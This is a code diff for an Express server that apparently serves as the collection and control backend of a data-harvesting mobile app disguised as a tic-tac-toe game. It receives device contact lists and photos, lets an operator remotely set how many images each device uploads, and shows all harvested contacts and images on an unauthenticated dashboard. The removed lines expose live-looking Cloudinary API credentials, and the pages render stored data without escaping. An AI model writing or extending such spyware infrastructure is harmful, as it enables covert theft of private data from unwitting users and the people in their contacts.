@@ -1,19 +1,19 @@
 const express = require("express");
-const bodyParser = require("body-parser");
 const { Pool } = require("pg");
 const cloudinary = require("cloudinary").v2;
 const multer = require("multer");
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 const upload = multer({ storage: multer.memoryStorage() });
 
-// ================= CLOUDINARY CONFIG =================
+// ================= CLOUDINARY =================
 cloudinary.config({
-  cloud_name: "du8blv9lz",
-  api_key: "882178698853985",
-  api_secret: "VTm3u2At-ouqRc6uEznsdOc0lxE"
+  cloud_name: process.env.CLOUD_NAME,
+  api_key: process.env.API_KEY,
+  api_secret: process.env.API_SECRET
 });
 
 // ================= DATABASE =================
@@ -27,8 +27,7 @@ async function initDB() {
   await pool.query(`
     CREATE TABLE IF NOT EXISTS users (
       id SERIAL PRIMARY KEY,
-      device_id TEXT UNIQUE,
-      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      device_id TEXT UNIQUE
     );
 
     CREATE TABLE IF NOT EXISTS images (
@@ -36,40 +35,117 @@ async function initDB() {
       device_id TEXT,
       image_url TEXT
     );
+
+    CREATE TABLE IF NOT EXISTS contacts (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT,
+      contact TEXT
+    );
   `);
 }
 initDB();
 
-// ================= UPLOAD IMAGE =================
+// ================= CONTROL =================
+let config = { limit: 5, offset: 0 };
+
+app.get("/config/:device_id", (req, res) => {
+  res.json(config);
+});
+
+app.post("/set-config", (req, res) => {
+  config.limit = parseInt(req.body.limit);
+  config.offset = parseInt(req.body.offset);
+  res.redirect("/control");
+});
+
+// ================= DASHBOARD =================
+app.get("/", async (req, res) => {
+
+  const users = await pool.query("SELECT COUNT(*) FROM users");
+  const images = await pool.query("SELECT COUNT(*) FROM images");
+  const contacts = await pool.query("SELECT COUNT(*) FROM contacts");
+
+  res.send(`
+  <html>
+  <head>
+    <title>Dashboard</title>
+    <style>
+      body { background:#0f172a; color:white; font-family:sans-serif; padding:20px;}
+      .card { background:#1e293b; padding:20px; margin:10px; border-radius:12px;}
+      a { color:#22c55e; text-decoration:none;}
+      input { padding:5px; margin:5px;}
+      button { padding:8px 12px; background:#22c55e; border:none; color:white;}
+    </style>
+  </head>
+  <body>
+
+    <h1>🚀 Backend Dashboard</h1>
+
+    <div class="card">👤 Users: ${users.rows[0].count}</div>
+    <div class="card">🖼 Images: ${images.rows[0].count}</div>
+    <div class="card">📞 Contacts: ${contacts.rows[0].count}</div>
+
+    <div class="card">
+      <h3>⚙️ Control Upload</h3>
+      <form method="POST" action="/set-config">
+        Limit: <input type="number" name="limit" value="${config.limit}"/>
+        Offset: <input type="number" name="offset" value="${config.offset}"/>
+        <button type="submit">Update</button>
+      </form>
+    </div>
+
+    <div class="card">
+      <a href="/users">👥 View Users</a><br><br>
+      <a href="/contacts">📞 View Contacts</a>
+    </div>
+
+  </body>
+  </html>
+  `);
+});
+
+// ================= RECEIVE CONTACTS =================
+app.post("/receive", async (req, res) => {
+
+  const { device_id, data } = req.body;
+
+  for (let contact of data) {
+    await pool.query(
+      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
+      [device_id, contact]
+    );
+  }
+
+  await pool.query(
+    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
+    [device_id]
+  );
+
+  res.send("Contacts saved ✅");
+});
+
+// ================= IMAGE UPLOAD =================
 app.post("/upload-image", upload.single("image"), async (req, res) => {
   try {
+
     const device_id = req.body.device_id;
 
-    if (!req.file) {
-      return res.status(400).send("No file");
-    }
-
-    // Upload to Cloudinary
     const stream = cloudinary.uploader.upload_stream(
       { folder: "tic_tac_toe_app" },
       async (error, result) => {
-        if (error) {
-          console.error(error);
-          return res.status(500).send("Upload error");
-        }
+
+        if (error) return res.status(500).send("Upload error");
 
         const imageUrl = result.secure_url;
 
-        // Save user
-        await pool.query(
-          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
-          [device_id]
-        );
-
-        // Save image URL
         await pool.query(
           "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
           [device_id, imageUrl]
+        );
+
+        await pool.query(
+          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
+          [device_id]
         );
 
         res.json({ url: imageUrl });
@@ -79,79 +155,79 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
     stream.end(req.file.buffer);
 
   } catch (err) {
-    console.error(err);
     res.status(500).send("Server error");
   }
 });
 
-// ================= VIEW USERS =================
+// ================= USERS =================
 app.get("/users", async (req, res) => {
-  const result = await pool.query("SELECT * FROM users ORDER BY id DESC");
 
-  let html = `
-  <html>
-  <body style="background:#0f172a;color:white;padding:20px;">
-  <h1>Users</h1>
-  `;
+  const users = await pool.query("SELECT * FROM users");
 
-  result.rows.forEach(user => {
+  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;
+
+  users.rows.forEach(u => {
     html += `
       <div style="margin:10px;">
-        <a href="/user/${user.device_id}" style="color:#22c55e;">
-          ${user.device_id}
-        </a>
+        <a href="/user/${u.device_id}">${u.device_id}</a>
       </div>
     `;
   });
 
-  html += "</body></html>";
+  html += `</body></html>`;
   res.send(html);
 });
 
-// ================= USER IMAGES =================
+// ================= USER DATA =================
 app.get("/user/:device_id", async (req, res) => {
-  try {
-    const device_id = req.params.device_id;
 
-    const images = await pool.query(
-      "SELECT * FROM images WHERE device_id=$1",
-      [device_id]
-    );
+  const device = req.params.device_id;
 
-    let html = `
-    <html>
-    <body style="background:#0f172a;color:white;padding:20px;">
-    <h1>Device: ${device_id}</h1>
-    `;
+  const images = await pool.query(
+    "SELECT * FROM images WHERE device_id=$1",
+    [device]
+  );
 
-    images.rows.forEach(img => {
-      html += `
-        <div style="margin:10px;">
-          <img src="${img.image_url}" width="200"/>
-        </div>
-      `;
-    });
+  const contacts = await pool.query(
+    "SELECT * FROM contacts WHERE device_id=$1",
+    [device]
+  );
 
-    html += "</body></html>";
-    res.send(html);
+  let html = `
+  <html>
+  <body style="background:#0f172a;color:white;padding:20px;">
+    <h2>Device: ${device}</h2>
+    <h3>🖼 Images</h3>
+  `;
 
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Error loading user data");
-  }
+  images.rows.forEach(img => {
+    html += `<img src="${img.image_url}" width="150" style="margin:5px;"/>`;
+  });
+
+  html += `<h3>📞 Contacts</h3>`;
+
+  contacts.rows.forEach(c => {
+    html += `<div>${c.contact}</div>`;
+  });
+
+  html += `</body></html>`;
+
+  res.send(html);
 });
 
-// ================= HOME =================
-app.get("/", (req, res) => {
-  res.send(`
-    <html>
-    <body style="background:#0f172a;color:white;text-align:center;padding:50px;">
-      <h1>Backend Running ✅</h1>
-      <a href="/users" style="color:#22c55e;font-size:20px;">View Users</a>
-    </body>
-    </html>
-  `);
+// ================= CONTACTS PAGE =================
+app.get("/contacts", async (req, res) => {
+
+  const contacts = await pool.query("SELECT * FROM contacts");
+
+  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;
+
+  contacts.rows.forEach(c => {
+    html += `<div>${c.device_id} → ${c.contact}</div>`;
+  });
+
+  html += `</body></html>`;
+  res.send(html);
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running 🚀"));
+app.listen(process.env.PORT || 3000);
